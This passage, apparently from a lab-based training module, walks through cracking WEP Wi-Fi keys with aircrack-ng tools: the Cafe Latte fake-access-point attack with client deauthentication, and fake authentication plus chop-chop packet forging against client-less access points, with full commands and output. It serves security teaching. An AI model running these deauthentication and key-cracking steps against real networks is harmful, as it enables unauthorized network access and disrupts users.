+Starting PTW attack with <span class="hljs-number">116410</span> ivs.
+
+                         KEY FOUND! [ <span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span>:<span class="hljs-number">11</span> ] 
+
+Attack Decrypted <span class="hljs-string">correctly:</span> <span class="hljs-number">100</span>% captured ivs.
+</code></pre>
+<hr>
+<h2 id="the-cafe-latte-attack">The Cafe Latte Attack</h2>
+<hr>
+<p>The <a href="https://www.aircrack-ng.org/doku.php?id=cafe-latte">Cafe Latte</a> attack exploits how WEP clients handle reauthentication requests, enabling attackers to generate traffic and capture enough IVs to crack the WEP key without requiring traffic from the AP.</p>
+<p>Both <code>fragmentation</code> and <code>Korek chop chop</code> attacks rely on traffic being generated in the network, such as clients browsing the internet, to capture and forge packets. Similarly, the <code>ARP request replay</code> attack requires valid ARP traffic in the network. If no traffic is being generated by clients, these attacks cannot be performed. However, in such cases, the <code>Cafe Latte</code> attack can directly target the clients instead.</p>
+<p>Essentially, the Cafe Latte attack is a variation of an ARP Request Replay attack aimed at connected clients. It can be likened to an evil-twin attack for WEP. To execute it, a fake access point with the same BSSID as the target network is created, running in WEP mode, and clients are deauthenticated from the target network, forcing them to reconnect to the fake access point. This setup generates the desired ARP packets, which are replayed repeatedly using the ARP request replay attack to collect enough initialization vectors (IVs) to crack the WEP key. Four terminals will be required to execute this attack successfully.</p>
+<hr>
+<p>We first need to enable monitor mode on our wireless network interface. This allows us to capture and inject packets.</p>
+<p><strong>Enabling Monitor Mode</strong></p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airmon-ng start wlan0
+
+Found 2 processes that could cause trouble.
+Kill them using 'airmon-ng<span class="hljs-built_in"> check </span>kill' before putting
+the card in<span class="hljs-built_in"> monitor </span>mode, they will interfere by changing channels<span class="hljs-built_in">
+and </span>sometimes putting the interface back in managed mode
+
+    PID Name
+    559 NetworkManager
+    798 wpa_supplicant
+
+PHY     Interface       Driver          Chipset
+
+phy0    wlan0           rt2800usb       Ralink Technology, Corp. RT2870/RT3070
+                (mac80211<span class="hljs-built_in"> monitor </span>mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
+                (mac80211 station mode vif disabled for [phy0]wlan0)
+</code></pre>
+<p>We can test to see if our interface is in monitor mode with the <code>iwconfig</code> utility.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ iwconfig
+
+wlan0mon  IEEE <span class="hljs-number">802.11</span>  <span class="hljs-string">Mode:</span>Monitor  <span class="hljs-string">Frequency:</span><span class="hljs-number">2.457</span> GHz  Tx-Power=<span class="hljs-number">30</span> dBm   
+          Retry <span class="hljs-keyword">short</span>  <span class="hljs-keyword">long</span> <span class="hljs-string">limit:</span><span class="hljs-number">2</span>   RTS <span class="hljs-string">thr:</span>off   Fragment <span class="hljs-string">thr:</span>off
+          Power <span class="hljs-string">Management:</span>off
+</code></pre>
+<hr>
+<p><strong>Performing the Attack</strong></p>
+<p>To begin, we scan our target access point using <code>airodump-ng</code> and capture the communication into a file. We specify our interface in monitor mode with <code>wlan0mon</code>, the channel our access point is running on with <code>-c</code>, and the location to save the capture file with the <code>-w</code> argument.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airodump-ng wlan0mon -c<span class="hljs-number"> 1 </span>-w WEP
+
+09:49:22  Created capture file "WEP-01.cap".
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 3 </span>mins ][ 2024-08-06 09:53
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ B2:D1:AC:E1:21:D1  -29  <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 5011 </span>   <span class="hljs-number"> 8132 </span> <span class="hljs-number"> 78 </span> <span class="hljs-number"> 1 </span> <span class="hljs-number"> 54 </span>  WEP  WEP    OPN  HackTheWifi
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ B2:D1:AC:E1:21:D1  B6:1F:98:CB:10:78  -29   <span class="hljs-number"> 1 </span>-<span class="hljs-number"> 1 </span>    <span class="hljs-number"> 0 </span>   <span class="hljs-number"> 9404 </span>        HackTheWifi
+</code></pre>
+<p>In a second terminal, we can start the <code>Cafe Latte</code> attack using <code>aireplay-ng</code>. We specify the Cafe Latte attack mode with <code>-6</code>, the BSSID of the target AP with <code>-b</code>, and the client MAC address with <code>-h</code>. This will listen for a station to connect, and replay any captured ARP requests to the client.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ aireplay-ng -6 -<span class="hljs-keyword">D</span> -b B2:D1:<span class="hljs-keyword">AC</span>:E1:21:D1 -<span class="hljs-keyword">h</span> B6:1F:98:CB:10:78 wlan0mon
+
+The interface <span class="hljs-keyword">MAC</span> (02:00:00:00:01:00) doesn't match the specified <span class="hljs-keyword">MAC</span> (-<span class="hljs-keyword">h</span>).
+        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
+Saving ARP requests <span class="hljs-keyword">in</span> replay_arp-0806-094956.<span class="hljs-keyword">cap</span>
+You should also start airodump-ng to <span class="hljs-keyword">capture</span> replies.
+<span class="hljs-keyword">Read</span> 99 packets (got 0 ARP requests), sent 0 packets...
+</code></pre>
+<p>Once the Cafe Latte listener is running, the next step is to launch a fake access point in a third terminal. The ESSID and BSSID of this access point must match those of the target network to deceive deauthenticated clients into reconnecting and sharing their ARP requests. The <code>airbase-ng</code> tool is used to create this fake access point, with identical BSSID and ESSID to the target, operating on the same channel. Use the <code>-a</code> flag to specify the BSSID of the target AP, <code>-e</code> to set the ESSID, <code>-c</code> to select the channel, <code>-L</code> to initiate the Cafe Latte attack mode, and <code>-W 1</code> to enable WEP mode. For a complete list of command options and arguments for <code>airbase-ng</code>, refer to the documentation <a href="https://www.aircrack-ng.org/doku.php?id=airbase-ng">here</a>.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airbase-ng -c <span class="hljs-number">1</span> -a B2:D1:AC:E1:<span class="hljs-number">21</span>:D1  -e <span class="hljs-string">"HackTheWifi"</span> wlan0mon -W <span class="hljs-number">1</span> -L
+
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  Created tap interface at0
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  Trying <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> MTU <span class="hljs-keyword">on</span> at0 <span class="hljs-keyword">to</span> <span class="hljs-number">1500</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  Trying <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> MTU <span class="hljs-keyword">on</span> wlan0mon <span class="hljs-keyword">to</span> <span class="hljs-number">1800</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  Access Point <span class="hljs-keyword">with</span> BSSID B2:D1:AC:E1:<span class="hljs-number">21</span>:D1 started.
+</code></pre>
+<p>This will listen for a station to connect and replay any captured ARP requests to the client. This setup will deauthenticate deauthenticated clients into reconnecting to our network, allowing us to capture their ARP requests for further analysis and attack.</p>
+<p>Once our access point is up, we can deauthenticate the station in a fourth terminal using <code>aireplay-ng</code> to force the clients to reconnect to our fake access point.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aireplay-ng <span class="hljs-number">-0</span> <span class="hljs-number">10</span> -a <span class="hljs-string">B2:</span><span class="hljs-string">D1:</span><span class="hljs-string">AC:</span><span class="hljs-string">E1:</span><span class="hljs-number">21</span>:D1 -c <span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>  wlan0mon
+<span class="hljs-symbol">
+09:</span><span class="hljs-number">51</span>:<span class="hljs-number">22</span>  Waiting <span class="hljs-keyword">for</span> beacon frame (<span class="hljs-string">BSSID:</span> <span class="hljs-string">D8:</span><span class="hljs-string">D6:</span><span class="hljs-number">3</span><span class="hljs-string">D:</span><span class="hljs-string">EB:</span><span class="hljs-number">29</span>:D5) on channel <span class="hljs-number">1</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">23</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">24</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">25</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">27</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">29</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">30</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">31</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">32</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">34</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">35</span>  Sending <span class="hljs-number">64</span> directed DeAuth (code <span class="hljs-number">7</span>). <span class="hljs-string">STMAC:</span> [<span class="hljs-string">B6:</span><span class="hljs-number">1</span><span class="hljs-string">F:</span><span class="hljs-number">98</span>:<span class="hljs-string">CB:</span><span class="hljs-number">10</span>:<span class="hljs-number">78</span>] [ <span class="hljs-number">0</span>| <span class="hljs-number">0</span> ACKs]
+</code></pre>
+<p>When the target station is deauthenticated, we should see changes in our second and third terminal that are indicative of our attack succeeding.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ airbase-ng -c 1 -a B2:D1:AC:E1:21:D1  -e "HackTheWifi" wlan0mon -W 1 -L
+
+09:50:40  Created tap interface at0
+09:50:40  Trying to <span class="hljs-keyword">set</span> MTU <span class="hljs-keyword">on</span> at0 <span class="hljs-keyword">to</span> <span class="hljs-number">1500</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  Trying <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> MTU <span class="hljs-keyword">on</span> wlan0mon <span class="hljs-keyword">to</span> <span class="hljs-number">1800</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">40</span>  <span class="hljs-keyword">Access</span> Point <span class="hljs-keyword">with</span> BSSID B2:D1:AC:E1:<span class="hljs-number">21</span>:D1 started.
+<span class="hljs-number">09</span>:<span class="hljs-number">50</span>:<span class="hljs-number">53</span>  <span class="hljs-keyword">Starting</span> Caffe-Latte attack against B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> <span class="hljs-keyword">at</span> <span class="hljs-number">100</span> pps.
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">23</span>  <span class="hljs-keyword">Client</span> B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> associated (WEP) <span class="hljs-keyword">to</span> ESSID: <span class="hljs-string">"HackTheWifi"</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">35</span>  <span class="hljs-keyword">Client</span> B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> associated (WEP) <span class="hljs-keyword">to</span> ESSID: <span class="hljs-string">"HackTheWifi"</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">35</span>  <span class="hljs-keyword">Client</span> B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> associated (WEP) <span class="hljs-keyword">to</span> ESSID: <span class="hljs-string">"HackTheWifi"</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">35</span>  <span class="hljs-keyword">Client</span> B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> associated (WEP) <span class="hljs-keyword">to</span> ESSID: <span class="hljs-string">"HackTheWifi"</span>
+<span class="hljs-number">09</span>:<span class="hljs-number">51</span>:<span class="hljs-number">55</span>  <span class="hljs-keyword">Client</span> B6:<span class="hljs-number">1</span>F:<span class="hljs-number">98</span>:CB:<span class="hljs-number">10</span>:<span class="hljs-number">78</span> associated (WEP) <span class="hljs-keyword">to</span> ESSID: <span class="hljs-string">"HackTheWifi"</span>
+</code></pre>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-comment">@htb[/htb]$ aireplay-ng -6 -D -b B2:D1:AC:E1:21:D1 -h B6:1F:98:CB:10:78 wlan0mon
+
+The interface MAC (02:00:00:00:01:00) doesn't match the specified MAC (-h).
+        ifconfig wlan0mon hw ether B6:1F:98:CB:10:78
+Saving ARP requests in replay_arp-0806-094956.cap
+You should also start airodump-ng to capture replies.
+Notice: got a deauth/disassoc packet. Is the source MAC associated ?
+Notice: got a deauth/disassoc packet. Is the source MAC associated ?
+Read 171321 packets (9269 ARPs, 0 ACKs), sent 84553 packets...(479 pps)</span>
+</code></pre>
+<p>Once we have generated enough packets, we can use <code>aircrack-ng</code> to crack the WEP key using the captured initialization vectors (IVs) stored in the WEP-01.cap file.</p>
+<p>  The Cafe Latte Attack</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aircrack-ng -b <span class="hljs-string">B2:</span><span class="hljs-string">D1:</span><span class="hljs-string">AC:</span><span class="hljs-string">E1:</span><span class="hljs-number">21</span>:D1 WEP<span class="hljs-number">-01.</span>cap
+
+Reading packets, please wait...
+Opening WEP<span class="hljs-number">-01.</span>cap
+Read <span class="hljs-number">195576</span> packets.
+
+<span class="hljs-number">1</span> potential targets
+Got <span class="hljs-number">97822</span> out of <span class="hljs-number">95000</span> IVs
+Starting PTW attack with <span class="hljs-number">97822</span> ivs.
+                     KEY FOUND! [ <span class="hljs-number">33</span>:<span class="hljs-number">44</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span>:<span class="hljs-number">11</span> ]
+Attack Decrypted <span class="hljs-string">correctly:</span> <span class="hljs-number">100</span>% captured ivs.
+</code></pre>
+<hr>
+<p> While executing the Cafe Latte attack, if no ARP packets are generated, it is recommended to rerun the deauthentication attack using "aireplay-ng" then immediately execute the "airbase-ng" command.</p>
+<hr>
+<p>In the following section, we will explore how to attack a WEP network when no clients are connected and no traffic is being generated. This will involve using <code>aireplay-ng</code> to fake authenticate with the access point, thereby generating traffic, followed by utilizing fragmentation or Korek chop chop attacks to forge packets and generate ARP requests.</p>
+<hr>
+<h2 id="attacking-wep-access-points-without-clients">Attacking WEP Access Points Without Clients</h2>
+<hr>
+<p>Suppose our target network does not have any wireless clients connected and there are no ARP requests coming from any Ethernet-connected stations. In this scenario, we can perform a special <code>Fragmentation</code> or <code>KoreK chop chop</code> attack in combination with <a href="https://www.aircrack-ng.org/doku.php?id=fake_authentication">fake authentication</a>. It's important to note that while this method works on some networks, it is not universally effective, and ultimately depends on whether the network is vulnerable to fake authentication or not.</p>
+<p>We will need three terminals for this attack. In the first terminal, we scan the target network and capture its communications using <code>airodump-ng</code>.</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 3 </span>--bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 4 </span>mins ][ 2024-08-10 19:01
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ 60:38:E0:71:E9:DC  -47<span class="hljs-number"> 100 </span>   <span class="hljs-number"> 2825 </span>     <span class="hljs-number"> 44 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         Virt-Corp
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+</code></pre>
+<p>Once this is running, in our second terminal we will begin packet crafting attempts. This involves using our interface's MAC address to authenticate with the access point. We employ the following command, specifying fake authentication with <code>-1</code>, the re-association interval with <code>1000</code>, the ESSID of the network with <code>-e</code>, the BSSID with <code>-a</code>, our MAC address with <code>-h</code>, and the keep-alive request interval with <code>-q</code>. Additionally, we use <code>-o 1</code> to send only one set of packets at a time.</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aireplay-ng <span class="hljs-number">-1</span> <span class="hljs-number">1000</span> -o <span class="hljs-number">1</span> -q <span class="hljs-number">5</span> -e HTB-Wireless -a <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">71</span>:<span class="hljs-string">E9:</span>DC -h <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 wlan0mon
+
+Sending Authentication Request
+Authentication successful
+Sending Association Request
+Association <span class="hljs-string">successful :</span>-)
+</code></pre>
+<p> Note: We supply our own interface's MAC address (00:c0:ca:98:3e:e0) as the attacker.\</p>
+<p>In the <code>airodump-ng</code> output, we can confirm that fake authentication was successful as our MAC address now appears as a client connected to the AP.</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo airodump-ng -c<span class="hljs-number"> 3 </span>--bssid 60:38:E0:71:E9:DC wlan0mon -w WEP
+
+ CH <span class="hljs-number"> 1 </span>][ Elapsed:<span class="hljs-number"> 4 </span>mins ][ 2024-08-10 19:01
+
+ BSSID              PWR RXQ  Beacons    <span class="hljs-comment">#Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID</span>
+
+ 60:38:E0:71:E9:DC  -47<span class="hljs-number"> 100 </span>   <span class="hljs-number"> 2825 </span>     <span class="hljs-number"> 44 </span>  <span class="hljs-number"> 0 </span> <span class="hljs-number"> 3 </span> <span class="hljs-number"> 11 </span>  WEP  WEP         Virt-Corp
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 60:38:E0:71:E9:DC  00:c0:ca:98:3e:e0  -29   <span class="hljs-number"> 0 </span>-<span class="hljs-number"> 1 </span>    <span class="hljs-number"> 0 </span>  <span class="hljs-number"> 13847 </span>        Virt-Corp
+</code></pre>
+<p>Then, in a third terminal, we initiate either a fragmentation or KoreK chop chop attack. To start a KoreK chop chop attack, we use the following command, specifying the access point's BSSID with <code>-b</code> and our interface's MAC address with <code>-h</code>.</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aireplay-ng <span class="hljs-number">-4</span> -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">71</span>:<span class="hljs-string">E9:</span>DC -h <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 wlan0mon
+
+Read <span class="hljs-number">667</span> packets...
+<span class="hljs-symbol">
+        Size:</span> <span class="hljs-number">392</span>, <span class="hljs-string">FromDS:</span> <span class="hljs-number">1</span>, <span class="hljs-string">ToDS:</span> <span class="hljs-number">0</span> (WEP)
+
+              BSSID  =  <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">71</span>:<span class="hljs-string">E9:</span>DC
+          Dest. MAC  =  <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0
+         Source MAC  =  <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">71</span>:<span class="hljs-string">E9:</span>DC
+
+Use <span class="hljs-keyword">this</span> packet ? y
+
+Offset  389 ( 0% done) | xor = 9A | pt = AF |   58 frames written in  1067ms
+Offset  388 ( 0% done) | xor = B4 | pt = AB |  178 frames written in  3212ms
+Offset  387 ( 1% done) | xor = F8 | pt = CB |  244 frames written in  4395ms
+&lt;snip&gt;
+Saving plaintext in replay_dec-1229-160018.cap
+Saving keystream in replay_dec-1229-160018.xor
+</code></pre>
+<p>Once we have successfully captured the PRGA keystream to a <code>.xor</code> file, we will use <code>packetforge-ng</code> to forge a packet and inject it into the network with no stations. We do so with the following command, specifying the access point MAC with <code>-a</code>, our associated interface MAC with <code>-h</code>, our guessed source IP with <code>-l</code>, our guessed destination IP with <code>-k</code>, our replay file with <code>-y</code>, and write destination with <code>-w</code>. If we do not know the IP, we could just use <code>255.255.255.0</code> or <code>255.255.255.255</code>.</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ packetforge-ng <span class="hljs-number">-0</span> -a <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">e0:</span><span class="hljs-number">71</span>:<span class="hljs-string">e9:</span>dc -h <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0 -k <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> -l <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.64</span> -y replay_dec<span class="hljs-number">-1229</span><span class="hljs-number">-160018.</span>xor -w forgedarp.cap
+
+Wrote packet <span class="hljs-string">to:</span> forgedarp.cap
+</code></pre>
+<p>Now that we have a forged ARP packet, we can inject it back into the network. We do so with the following command:</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ aireplay-ng <span class="hljs-number">-2</span> -r forgedarp.cap wlan0mon
+<span class="hljs-symbol">
+        Size:</span> <span class="hljs-number">68</span>, <span class="hljs-string">FromDS:</span> <span class="hljs-number">0</span>, <span class="hljs-string">ToDS:</span> <span class="hljs-number">1</span> (WEP)
+
+              BSSID  =  <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:<span class="hljs-string">E0:</span><span class="hljs-number">71</span>:<span class="hljs-string">E9:</span>DC
+          Dest. MAC  =  <span class="hljs-string">FF:</span><span class="hljs-string">FF:</span><span class="hljs-string">FF:</span><span class="hljs-string">FF:</span><span class="hljs-string">FF:</span>FF
+         Source MAC  =  <span class="hljs-number">00</span>:<span class="hljs-string">c0:</span><span class="hljs-string">ca:</span><span class="hljs-number">98</span>:<span class="hljs-number">3</span><span class="hljs-string">e:</span>e0
+Use <span class="hljs-keyword">this</span> packet ? y
+</code></pre>
+<p>Once this is going, we wait several moments as the initialization vectors generate. We could also start an ARP request replay attack to speed things up, as we have done previously. Once enough traffic is generated, we can attempt to crack the key with <code>aircrack-ng</code>, using the default PTW method:</p>
+<p>  Attacking WEP Access Points Without Clients</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ sudo aircrack-ng -b <span class="hljs-number">60</span>:<span class="hljs-number">38</span>:E0:<span class="hljs-number">71</span>:E9:DC WEP-<span class="hljs-number">01</span>.cap
+
+                                                 Aircrack-ng <span class="hljs-number">1</span>.<span class="hljs-number">7</span> 
+
+
+                                   [<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>] Tested <span class="hljs-number">2</span> keys (got <span class="hljs-number">26962</span> IVs)
+
+   KB    depth   byte(vote)
+    <span class="hljs-number">0</span>    <span class="hljs-number">0</span>/  <span class="hljs-number">1</span>   <span class="hljs-number">26(36352</span>) C<span class="hljs-number">7(35328</span>) <span class="hljs-number">2</span>B(<span class="hljs-number">34560</span>) <span class="hljs-number">6</span>D(<span class="hljs-number">33024</span>) B<span class="hljs-number">2(32512</span>) <span class="hljs-number">06(32000</span>) <span class="hljs-number">28(32000</span>) D<span class="hljs-number">7(32000</span>) 
+    <span class="hljs-number">1</span>    <span class="hljs-number">0</span>/  <span class="hljs-number">1</span>   <span class="hljs-number">27(37888</span>) <span class="hljs-number">4</span>B(<span class="hljs-number">35328</span>) BD(<span class="hljs-number">33536</span>) <span class="hljs-number">77(32768</span>) <span class="hljs-number">26(32512</span>) AE(<span class="hljs-number">32512</span>) <span class="hljs-number">68(32000</span>) <span class="hljs-number">87(32000</span>) 
+    <span class="hljs-number">2</span>    <span class="hljs-number">0</span>/  <span class="hljs-number">1</span>   F<span class="hljs-number">6(40448</span>) E<span class="hljs-number">2(34304</span>) <span class="hljs-number">2</span>B(<span class="hljs-number">34048</span>) <span class="hljs-number">89(34048</span>) <span class="hljs-number">31(33536</span>) <span class="hljs-number">99(33280</span>) <span class="hljs-number">9</span>F(<span class="hljs-number">33280</span>) DE(<span class="hljs-number">33280</span>) 
+    <span class="hljs-number">3</span>    <span class="hljs-number">0</span>/  <span class="hljs-number">1</span>   <span class="hljs-number">85(35072</span>) <span class="hljs-number">7</span>D(<span class="hljs-number">34304</span>) <span class="hljs-number">0</span>D(<span class="hljs-number">34048</span>) C<span class="hljs-number">1(33536</span>) <span class="hljs-number">55(32256</span>) F<span class="hljs-number">7(32000</span>) <span class="hljs-number">36(31744</span>) <span class="hljs-number">79(31744</span>) 
